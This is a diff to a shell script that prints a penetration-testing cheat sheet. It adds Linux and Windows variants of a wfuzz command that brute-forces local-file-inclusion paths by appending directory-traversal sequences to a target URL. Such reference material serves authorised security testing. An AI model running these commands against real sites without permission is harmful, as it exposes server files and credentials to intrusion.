@@ -41,7 +41,8 @@ echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}LFI files Bruteforce${End} ${Frame}###${End}"
-echo -e "${Point} wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hh 0 \$URL../../../../../../../FUZZ"
+echo -e "${Point} wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hh 0 \$URL../../../../../../../FUZZ ${Comment}# linux${End}"
+echo -e "${Point} wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt --hh 0 \$URL../../../../../../../FUZZ ${Comment}# windows${End}"
 echo -e ""
 
 
